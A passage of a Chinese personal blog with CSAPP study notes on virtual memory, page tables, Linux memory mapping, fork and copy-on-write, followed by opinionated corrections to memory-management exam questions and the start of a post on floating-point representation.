</tr>
</thead>
<tbody>
<tr>
<td>字节偏移CO</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>缓存索引CI</td>
<td><code>0x5</code></td>
</tr>
<tr>
<td>缓存标记CT</td>
<td><code>0xD</code></td>
</tr>
<tr>
<td>缓存命中</td>
<td>是</td>
</tr>
<tr>
<td>返回的缓存字节</td>
<td><code>0x1D</code></td>
</tr>
</tbody>
</table>
<h3 id="多级页表的地址翻译">多级页表的地址翻译</h3>
<h4 id="以两级页表为例">以两级页表为例</h4>
<p>单级页表
的时候,一条页表项对应一个虚拟页,一张页表就可以管理整个虚拟内存的页</p>
<p>如果虚拟地址空间更大,页更多,则页表项目更多,而页表也是存放在内存中的,如果页表也大到内存装不下该当如何?</p>
<blockquote>
<p>这就好比刚上大学的时候所有的<strong>学习资料</strong>都可以放在一个文件夹里</p>
<p>但是日积月累,学习资料文件夹变得臃肿,想要找到一个文件就像大海捞针</p>
<p>因此应该建立子文件夹,比如<code>/reverse</code>,<code>/pwn</code>,<code>/web</code>等等</p>
<p>时间长了每个子文件夹又会臃肿,又可以根据时间或者难易程度建立子子文件夹</p>
</blockquote>
<p>高级页表的表项是低级页表的索引</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516231018326.png"
alt="image-20220516231018326" />
<figcaption aria-hidden="true">image-20220516231018326</figcaption>
</figure>
<p>这里二级页表和前面的单级页表作用类似,直接索引虚拟页,但是也有些许区别</p>
<blockquote>
<p>单级页表结构中只有一个页表,第i个页表项就指向第i个虚拟页</p>
</blockquote>
<p>这里二级页表有多个,每个二级页表只对应虚拟内存中的连续的1024个虚拟页,二级页表的表项都是从0开始编号的但是虚拟内存中的页是统一编号的</p>
<p>一级页表的作用是索引二级页表</p>
<p>一级页表的表项,其有效位标志着对应二级页表对应的1024个虚拟页都没有被缓存过</p>
<blockquote>
<p>但凡这1024个虚拟页中有一个被缓存,其在二级页表中的表项的有效位为1,则该二级页表对应一级页表中的表项有效位就得是1</p>
</blockquote>
<p>只有一级页表是常驻内存的,只有有效位为1表项对应的二级页表才会被搬进内存,不用的时候还得被挤出去</p>
<h4 id="k级页表的地址翻译">k级页表的地址翻译</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516231949258.png"
alt="image-20220516231949258" />
<figcaption aria-hidden="true">image-20220516231949258</figcaption>
</figure>
<p>一级页表表项中存放的是二级页表的索引,二级页表表项中存放的是三级页表的索引,以此类推,直到最低级页表,其表项才是物理地址,</p>
<p>从高级页表一直索引到低级页表的过程中,但凡有一个页表项的有效位为0则引发缺页</p>
<p>缺页也是逐级修复的,</p>
<p>只有最低级页表项才存放实际的物理页号,然后物理页号和页偏移拼起来组成物理地址</p>
<p>可气的是,虽然有这么多级,但是总有人能设计得它的速度能和单级页表媲美</p>
<h3
id="英特尔酷睿i7linux内存系统地址翻译">英特尔酷睿i7/Linux内存系统地址翻译</h3>
<p>多级页表结构,每个进程允许有自己私有的页表层次结构</p>
<p>页大小采用4KB,四级页表结构</p>
<p>这里第一次见到"CR3控制寄存器",其作用是指向一级页表的起始位置,CR3是每个进程上下文的一部分,每个进程都有自己独立的页表结构,执行A进程时CR3就应该指向A进程的一级页表起始位置</p>
<blockquote>
<p>一级页表可以有多个吗?</p>
<p>还是说只有一个一级页表,管理所有的二级页表,然后进程从二级页表开始有自己的独立地址空间</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073701065.png"
alt="image-20220517073701065" />
<figcaption aria-hidden="true">image-20220517073701065</figcaption>
</figure>
<p>高级页表(除了直接管理虚拟内存的最低级页表),其结构如下:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073820824.png"
alt="image-20220517073820824" />
<figcaption aria-hidden="true">image-20220517073820824</figcaption>
</figure>
<p>最低级页表结构如下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073849861.png"
alt="image-20220517073849861" />
<figcaption aria-hidden="true">image-20220517073849861</figcaption>
</figure>
<h2 id="linux虚拟内存系统">Linux虚拟内存系统</h2>
<p>进程的虚拟内存</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517074643634.png"
alt="image-20220517074643634" />
<figcaption aria-hidden="true">image-20220517074643634</figcaption>
</figure>
<p>进程虚拟内存部分(用户栈向下)是进程的独立的虚拟地址空间,</p>
<p>内核虚拟空间被所有进程共享,共享的实现是通过页表的一些表项指向相同的物理地址,然后页表项上标明内核虚拟内存只读</p>
<p>共享库等技术的实现也是基于虚拟内存的,但都是后话了</p>
<h3 id="linux虚拟内存区域组成">Linux虚拟内存区域组成</h3>
<p>虚拟内存分段,被分段的虚拟内存区域就一定已经被分配了</p>
<p>只要是存在的虚拟页就一定属于某个段,</p>
<p>未使用的虚拟页不会被记录,没有页表指向该位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517080056415.png"
alt="image-20220517080056415" />
<figcaption aria-hidden="true">image-20220517080056415</figcaption>
</figure>
<p><code>task_struct</code>指向内核运行该进程的所有信息</p>
<blockquote>
<p>PID,指向用户栈的指针rsp,可执行目标文件名字,程序计数器rip</p>
</blockquote>
<p><code>mm_struct</code>描述虚拟内存的当前状态,其中的两个字段<code>pgd,mmap</code></p>
<p><code>pgd</code>指向一级页表的基址</p>
<p><code>mmap</code>指向<code>vm_area_structs</code>链表,该链表的每一个链表项都描述了当前虚拟内存地址空间的一个段.</p>
<blockquote>
<p>每个<code>vm_area_struct</code>链表项都有五部分组成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vm_start:段起始地址</span><br><span class="line">vm_end:段结束地址</span><br><span class="line">vm_prot:段的读写权限</span><br><span class="line">vm_flags:段共享或者进程私有标志等信息</span><br><span class="line">vm_next:指向下一个段</span><br></pre></td></tr></table></figure>
</blockquote>
<p>当该进程被执行的时候,pgd会被放到<code>CR3</code>寄存器中</p>
<h3 id="linux缺页异常处理">Linux缺页异常处理</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517081116670.png"
alt="image-20220517081116670" />
<figcaption aria-hidden="true">image-20220517081116670</figcaption>
</figure>
<p>CPU指定一个虚拟地址,然后去<code>vm_area_struct</code>各个表项去查该虚拟地址是否属于<span
class="math inline">\([vm_{start},vm_{end}]\)</span>之间,如果各个链表项都不包含该地址则说明该地址没有被分配,发生段错误</p>
<p>如果没有发生段错误则检查该内存访问的性质,是读还是写,如果对只读区域进行写入则报告保护异常</p>
<p>上述两种情况都通过了则表明这是真的缺页了,使用某种页调度算法牺牲一个物理页,用这个缺页挤掉</p>
<h2 id="内存映射">内存映射</h2>
<p>啥是内存映射呢?</p>
<p>以共享虚拟内存举例</p>
<p>两个进程的页表相互独立,但是可以指向物理内存中的同一区域,比如共享库</p>
<p><strong>通过将一个虚拟内存区与磁盘上一个对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为内存映射</strong></p>
<h3 id="共享对象">共享对象</h3>
<p>如果同时打开多个终端bash,它们会共享同一块只读代码区.多个程序调用库函数printf,但是实际最后调用到的printf只在物理内存中唯一存在</p>
<p>通过一个例子说明共享对象的过程</p>
<p>一开始时共享对象也只是虚拟内存上的一些页或者说段,尚未被任何进程映射.</p>
<p>现在进程1将共享对象映射到自己虚拟内存中的某个位置,并在物理内存中建立了物理页</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517083739843.png"
alt="image-20220517083739843" />
<figcaption aria-hidden="true">image-20220517083739843</figcaption>
</figure>
<p>现在进程2也想映射共享对象,内核判断进程1已经映射过该共享对象,即共享对象已经存在于物理内存中,那么只需让进程2的相关页表项指向该共享对象在内存中快照的物理页</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084031704.png"
alt="image-20220517084031704" />
<figcaption aria-hidden="true">image-20220517084031704</figcaption>
</figure>
<p><strong>私有写时复制对象</strong></p>
<p>什么时候一个对象不得不每个进程分别映射到不同的物理内存了,什么时候才会真的在物理内存上开两个对象的空间</p>
<p>在两个进程都没有尝试向私有对象写东西时,私有对象表现得和共享对象没有区别,物理内存中也只存在一份拷贝,因为这足以满足读的要求</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084442357.png"
alt="image-20220517084442357" />
<figcaption aria-hidden="true">image-20220517084442357</figcaption>
</figure>
<p>当其中一个进程试图写私有对象时,由于要保证进程的虚拟地址空间独立,因此不得不将该私有对象做一个拷贝,在内存中存放两个私有对象,两个进程的页表项目各自挑一个指向</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517084658157.png"
alt="image-20220517084658157" />
<figcaption aria-hidden="true">image-20220517084658157</figcaption>
</figure>
<h3 id="fork函数">fork函数</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void);//子进程返回0,父进程返回子进程的pid,出错返回-1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.子进程获得一个pid</p>
<p>2.子进程得到与父进程<strong>一模一样</strong>的<strong>用户级</strong>虚拟地址空间<strong>拷贝</strong></p>
<blockquote>
<p>用户级虚拟地址空间包括</p>
<p>代码段</p>
<p>数据段</p>
<p>堆</p>
<p>共享库</p>
<p>用户栈</p>
</blockquote>
<p>3.子进程获得与父进程任何打开的文件描述符的副本</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> global=<span class="number">10</span>;<span class="comment">//观察父子进程是否有相同的.data节拷贝</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> local=<span class="number">20</span>;<span class="comment">//观察父子进程是否有相同的栈区拷贝</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actived\n&quot;</span>);<span class="comment">//观察fork前的部分是否会被子进程执行</span></span><br><span class="line">    <span class="type">pid_t</span> pid=fork();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;<span class="comment">//根据pid判断是父进程还是子进程,fork对父进程返回子进程的pid,不为0,如果为0则说明当前进程为子进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child process,%d,%d\n&quot;</span>,global++,local++);<span class="comment">//打印后自增的目的是观察父子进程是否有独立的虚拟地址空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;father process,%d,%d\n&quot;</span>,global++,local++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actived					<span class="comment">#fork函数前只有父进程,fork之后才会两个进程都执行</span></span><br><span class="line">father process,10,20	 </span><br><span class="line">child process,10,20		<span class="comment">#子进程获得父进程虚拟地址空间的拷贝,但是两者独立,父进程地址空间内的变量自增不会影响子进程的地址空间</span></span><br></pre></td></tr></table></figure>
<p>子进程和父进程都打印到控制台表明两者共享文件描述符1(标准输出)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517091716338.png"
alt="image-20220517091716338" />
<figcaption aria-hidden="true">image-20220517091716338</figcaption>
</figure>
<h2 id="内存动态分配">内存动态分配</h2>
<p>动态内存分配器(dynamic memory allocator),维护进程的堆区</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517093706745.png"
alt="image-20220517093706745" />
<figcaption aria-hidden="true">image-20220517093706745</figcaption>
</figure>
<p>堆顶指针为brk,堆的生长方向与栈相反,堆从低地址向高地址生长,栈从高地址向低地址生长</p>
<p>都是小端模式</p>
<p>分配器将堆看成一组大小不同的块集合,每个块是一个连续的虚拟内存片</p>
<p>已分配的块就是正在被使用的块,空闲块就是尚未被使用的块,可以被分配</p>
<p>根据<strong>谁来释放分配块</strong>,分配器可以分成两种</p>
<p><strong>显式分配器</strong>:比如C语言的malloc和free,C++的new和delete,要求程序员手动释放分配块</p>
<p><strong>隐式分配器</strong>:分配器自动回收不再使用的分配块,因此隐式分配器又叫垃圾收集器,比如Java中的分配器</p>
<p>关于分配器的实现,这个实验是一定要做到的,但不是现在</p>
<h2 id="习题订正">习题订正</h2>
<h3 id="section">1.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612094124007.png"
alt="image-20220612094124007" />
<figcaption aria-hidden="true">image-20220612094124007</figcaption>
</figure>
<p>这个题的问法太屑了,相当于给你说已知a是b他老子,问a他爹是谁</p>
<p>需要注意的是逻辑地址和物理地址是啥</p>
<p>逻辑地址就是磁盘交换分区,虚拟地址空间中的一个地址,</p>
<p>物理地址就是内存条子,物理地址空间中的一个地址</p>
<p>每个.c源程序编译成.o可重定位目标文件之后,其虚拟地址空间都是从0开始编址</p>
<p>然后多个.o(也有可能有.a静态库文件)链接成.out可执行目标文件,其虚拟地址空间还是从0开始编址的,比如<span
class="math inline">\([0,0x100)\)</span></p>
<p>在装载时(shell调用execve函数将进程加载进入物理地址空间),有可能将该.out虚拟地址空间的0号字节装载进入内存条子这个物理地址空间的0x100处,那么该进程对应的物理地址空间就可能是<span
class="math inline">\([0x100,0x200)\)</span>(不考虑分页),如果考虑分页,那么虚拟地址空间可能被划分成多个虚拟页,在用到时被拷贝到一个物理页.</p>
<p>综上,形成逻辑地址的阶段是链接阶段</p>
<p>翻译成物理地址的阶段是装载</p>
<h3 id="section-1">4.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095053544.png"
alt="image-20220612095053544" />
<figcaption aria-hidden="true">image-20220612095053544</figcaption>
</figure>
<p>本题我选的B,纯粹是瞎选,选的时候就知道必定不对</p>
<p>出错是因为没有重视覆盖与交换技术,在此做一个复习</p>
<p>覆盖:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095244447.png"
alt="image-20220612095244447" />
<figcaption aria-hidden="true">image-20220612095244447</figcaption>
</figure>
<p>铁打的固定区,流水的覆盖区,用到谁就先把覆盖区存一下,然后把需要的从外存中拎出来,直接盖在先前的覆盖区上</p>
<p>算法竞赛中使用滚动数组,感觉也是覆盖的思想</p>
<p>交换:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095647336.png"
alt="image-20220612095647336" />
<figcaption aria-hidden="true">image-20220612095647336</figcaption>
</figure>
<p>在CSAPP上我们学过虚拟内存,缺页时发生替换的思想就是交换思想</p>
<p>这样看覆盖和交换都是新的替换旧的,好像说的是一个事情,但是区别:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612095842607.png"
alt="image-20220612095842607" />
<figcaption aria-hidden="true">image-20220612095842607</figcaption>
</figure>
<p>只有虚拟内存技术可以物理上拓展主存容量,而覆盖和交换技术在虚存之前就存在了</p>
<p>覆盖和交换还是在有限大的内存条子上做文章,只能通过扔掉当前用不到的,实现节省主存空间的作用</p>
<h3 id="section-2">9.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612100250957.png"
alt="image-20220612100250957" />
<figcaption aria-hidden="true">image-20220612100250957</figcaption>
</figure>
<p>这个题A,B选项都不太熟悉,借机了解一下存储管理方式吧</p>
<p>存储管理方式从进程地址空间的连续性上分为连续方式和非连续方式</p>
<p><strong>连续方式,不行</strong></p>
<p>​
连续方式包括单一连续分配(单道连续分配),固定分区分配(多道固定连续分配),连续动态分配(多道可变连续分配)</p>
<p>单道连续分配是最早最low逼的方式,整个内存条子上最多允许一个进程独占</p>
<p>多道固定连续分配意思是内存条子上划出几个块,每个块让一个进程独占,各个进程老死不相往来</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612100928491.png"
alt="image-20220612100928491" />
<figcaption aria-hidden="true">image-20220612100928491</figcaption>
</figure>
<p><strong>非连续方式,行</strong></p>
<p>​
非连续方式包括分段,分页,段页,都是比较近或者最近的操作系统正在使用的技术,比较熟悉</p>
<p>​ 比如x86上使用段页式结构,x86-64上使用分页结构</p>
<h3 id="section-3">14.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612101143722.png"
alt="image-20220612101143722" />
<figcaption aria-hidden="true">image-20220612101143722</figcaption>
</figure>
<p>这个题要清晰重定位的各种类型,谁来负责重定位,什么时候重定位</p>
<p>什么是重定位?<strong>装入时</strong>对目标程序中指令和数据的修改过程</p>
<p>一定要重定位吗?不一定,早期low逼程序和low逼内存系统上,程序编译完成之后一个各个变量指令的物理地址就知道了,不存在逻辑地址一说,比如在单道连续分配的内存系统上,一共就只有一个进程执行,整什么逻辑地址真是多次一举</p>
<p>凡是需要重定位的,一定有逻辑地址和物理地址的区分,重定位的过程就是将逻辑地址翻译成物理地址这个地址变换的过程</p>
<p>本题中A和B,都是连续存储方式,只要确定好程序在物理内存中的基地址,那么程序所有指令数据的地址就都确定了,根本不需要重定位,编译时决定物理地址即可</p>
<p>重定位的类型?静态重定位和动态重定位</p>
<p>​ 静态重定位指地址变换在<strong>装载时</strong>一次完成</p>
<p>​ 本题中D,段式结构就是静态重定位</p>
<p>​ 动态重定位指地址变换在<strong>运行时</strong>才会进行</p>
<p>​
用于分页系统,因为虚拟页实际加载进入哪一个物理页,这由操作系统页面置换算法决定,不到运行时,是不知道虚拟页到底被加载到哪里的,该虚拟页上的数据和指令自然无法被重定位</p>
<h3 id="section-4">18.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612102551429.png"
alt="image-20220612102551429" />
<figcaption aria-hidden="true">image-20220612102551429</figcaption>
</figure>
<p>我一开始选的是地址映射,我是这样考虑的</p>
<p>x86-64上任何进程都是从<code>0x400000</code>这个地址开始的,通过地址映射,该虚拟地址被翻译成不同的物理地址,因此不会出现两个进程虚拟地址空间指向同一块物理地址空间的情况,即避免了进程的相互干扰</p>
<p>我选的D,但是答案是B</p>
<p>意思是一个进程有一个基址寄存器和边界寄存器,该进程内任意内存访问不得超过两个寄存器规定的范围,因此由内存保护实现</p>
<h3 id="section-5">21.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612103002978.png"
alt="image-20220612103002978" />
<figcaption aria-hidden="true">image-20220612103002978</figcaption>
</figure>
<p>感觉这种题没有什么意义,让学生考虑段表和页表的大小,</p>
<p>用户物理地址空间=总空间-页表或段表表占的空间</p>
<p>你直接问页表大还是段表大不就行了?</p>
<p>你直接问页和段谁大小可变不就行了?</p>
<p>非得绕着弯说,根考察三年级学生两年后你和你老子谁年龄大一样.</p>
<p>你不就是想考察段大小可变,页大小固定这个事儿吗</p>
<h3 id="section-6">24.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612103815223.png"
alt="image-20220612103815223" />
<figcaption aria-hidden="true">image-20220612103815223</figcaption>
</figure>
<p>单道系统上某一时刻只有一个程序在运行,只需要维护一个重定位寄存器,谁在执行就把谁的基地址放到重定位寄存器上</p>
<h3 id="section-7">26.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104001176.png"
alt="image-20220612104001176" />
<figcaption aria-hidden="true">image-20220612104001176</figcaption>
</figure>
<p>还是考察对四个选项概念是不是认识</p>
<p>"可变分区"实际上还是连续内存的low逼方法</p>
<p>前面14题已经分析过了,分页存储管理是动态链接的</p>
<p>"有利于动态链接"不如说"必须动态链接"</p>
<h3 id="section-8">28.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104157764.png"
alt="image-20220612104157764" />
<figcaption aria-hidden="true">image-20220612104157764</figcaption>
</figure>
<p>考察对"可重入"的理解</p>
<p>CSAPP上我们学过"可重入"函数,就是不访问临界区的线程安全函数</p>
<p>既然不访问临界区,那么多个进程共享这一块也是没问题的,</p>
<p>只需要将共享区放在内存上,让有需要的进程引用本共享区,不需要每个进程分别拷贝一份</p>
<p>怎么就减少对换数量了呢?</p>
<p>啥叫"兑换"?不是缺页置换</p>
<p>不需要每个进程都加载共享区,一共加载一次就可以</p>
<h3 id="section-9">29.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104605803.png"
alt="image-20220612104605803" />
<figcaption aria-hidden="true">image-20220612104605803</figcaption>
</figure>
<p>这里"代价"是啥呢?</p>
<p>分段时需要操作系统维护段表,分页时需要维护页表</p>
<p>段表和页表也要占用内存,这就是代价</p>
<p>知道的越少,人越觉得自己厉害,叫什么穷开心不是吗?</p>
<p>分区是最早的内存管理方式,只需要维护有几个区,每个区放了啥.并且区相对于页和段大得多,操作系统维护的区表相对于页表段表会小很多,因此代价少</p>
<h3 id="section-10">34.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612104843836.png"
alt="image-20220612104843836" />
<figcaption aria-hidden="true">image-20220612104843836</figcaption>
</figure>
<p>前两条说的是真对,需要注意的是内碎片和外碎片是啥</p>
<p>第三条,影响磁盘访问时间的主要因素是啥呢?页面多大则需要从磁盘中拷贝出相应大小的页面,拷贝的越多用时越长,怎么就"主要因素通常不是页面大小了",III项纯粹故意说很长的假话吓唬人</p>
<p>那么影响磁盘访问时间的主要因素是啥呢?</p>
<p>寻道时间、旋转延迟、数据传输时间</p>
<p>页面大小会影响数据传输时间,当然是主要因素</p>
<h3 id="section-11">35.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612105228600.png"
alt="image-20220612105228600" />
<figcaption aria-hidden="true">image-20220612105228600</figcaption>
</figure>
<p>这个题的ACD三要都是白给</p>
<p>这让我想到高三做过的一道化学题</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612105424208.png"
alt="image-20220612105424208" />
<figcaption aria-hidden="true">image-20220612105424208</figcaption>
</figure>
<p>"取10.00ml稀释液的过程中,酸式滴定管的初始页面为0.20ml,左手控制活塞向锥形瓶中加稀释液,此时眼睛应该<code>____</code>"</p>
<p>你说写"睁着"吧,理论上也对,闭着眼儿万一倒手上把手烧个窝儿,还必须得睁着眼儿</p>
<p>那为啥不能写"睁着"呢?这睁着不是废话吗.这个题就想考察会不会说滴定流程的套话</p>
<p>在本题中我一开始选的A,这也是废话,页面大小一定得依据内存大小确定啊,要是内存4G,你整一个8G大小的页面有个锤子用呢?</p>
<p>本题就想考察"页面大小固定"这个事儿</p>
<p>但是D一定是不对的,外存就是一群乌合之众没有排面,内存少而精,外存一定是为内存服务的</p>
<p>C对不对呢?也有道理,比如如果数据总线宽度为64位,那么页面大小就1Byte占8位,都不够cpu拿来塞牙缝的.但是出题的认为这都不用说,是废话</p>
<h3 id="section-12">36.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612110227309.png"
alt="image-20220612110227309" />
<figcaption aria-hidden="true">image-20220612110227309</figcaption>
</figure>
<p>什么叫不懂装懂啊?</p>
<p>"方便操作",怎么操作,什么操作?你把"操作"去掉也是一个意思</p>
<p>就说"A.方便"</p>
<p>不妨把话说的更明白一点</p>
<p>"A.好"</p>
<p>好个球子啊</p>
<p>因为BCD这些优点显而易见,出题的实在想不到说个啥缺点,就整了一个"A.方便操作"</p>
<p>实际上这个答案啥也没说,就好比让你评价一下学校对卢雷事件的处理,你说了个"好!",怎么好了?给校风学风带来啥影响?给其他学生有啥影响?给外界啥影响?你是一个字不说,因为现在的处理方式吐不出象牙来</p>
<h3 id="section-13">39.</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612110742608.png"
alt="image-20220612110742608" />
<figcaption aria-hidden="true">image-20220612110742608</figcaption>
</figure>
<p>14题复习了重定位之后显然这个题选B,但是C和D我怎么没在教材上见到过</p>
<p>因为压根就没这两个概念.</p>
<p>这不就是某些政治家某些上级以及某些令人恶心的文科学科的口头禅吗</p>
<blockquote>
<p>正确的，直接的，中肯的，雅致的，客观的，完整的，立体的，全面的，辩证的，形而上学的，雅俗共赏的，一针见血的，直击要害的，错误的，间接的，虚假的，庸俗的，主观的，残缺的，平面的，片面的，孤立的，辩证法的..</p>
<p>落实,夯实,搞好,坚持,推进,改善,提高....</p>
<p>美国化,本土化,最大化,冲国化...</p>
</blockquote>
<p>政治跨考计算机的是不是就要选C了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/09/%E5%A4%AA%E7%A9%BA%E9%AD%94%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/09/%E5%A4%AA%E7%A9%BA%E9%AD%94%E6%95%B0/" class="post-title-link" itemprop="url">天空のグリニッジ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-09 18:18:00 / Modified: 18:19:29" itemprop="dateCreated datePublished" datetime="2022-06-09T18:18:00+08:00">2022-06-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="天空のグリニッジ">天空のグリニッジ</h1>
<blockquote>
<p>上司啦，政治家啦以及那些现在已经不存在的独裁者们都一样是渺小的人类。</p>
<p>自己只要向着自己能够认同的方向努力就好了。只是看到宇宙的照片就会有这样的感觉。
　</p>
<p>宇佐见莲子和玛艾露贝莉·赫恩（梅莉）二人，正坐在大学校园内的露天咖啡屋中兴奋的交谈着。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/06/%E6%B5%AE%E7%82%B9%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/06/%E6%B5%AE%E7%82%B9%E6%95%B0/" class="post-title-link" itemprop="url">CSAPP-chapter2&3 浮点数的机器级表示</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-06 18:55:00 / Modified: 19:08:55" itemprop="dateCreated datePublished" datetime="2022-06-06T18:55:00+08:00">2022-06-06</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="浮点数的机器级表示">浮点数的机器级表示</h1>
<p>师出有名</p>
<p>1.补上计组网课上摆烂留下的历史问题</p>
<p>2.将浮点数的表示和程序中的行为联系起来,完成CSAPP第二章和第三章最后剩下的浮点数部分</p>
<h2 id="药引子和命根子">药引子和命根子</h2>
<h3 id="从十进制科学计数法说起">从十进制科学计数法说起</h3>
<p>一个很长十进制数,成万上亿,在小学的时候我们就知道,可以用科学计数法表示</p>
<p>假设该十进制数按位展开表示成 <span class="math display">\[
d=d_{m}d_{m-1},,,d_{1}d_{0}.d_{-1}d_{-2},,,d_{-n}d=\sum_{i=-n}^{m}10^i\times
d_i\\
m,n\ge 0
\]</span></p>
<blockquote>
<p>注意<span class="math inline">\(d_0.d_{-1}\)</span>中间是小数点</p>
</blockquote>
<p>用科学计数法表示 <span class="math display">\[
d=d_m.d_{m-1}d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^m\\
=0.d_md_{m-1}d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^{m+1}\\
=d_md_{m-1}.d_{m-2},,,d_{0}d_{-1},,,d_{-n}\times 10^{m-1}
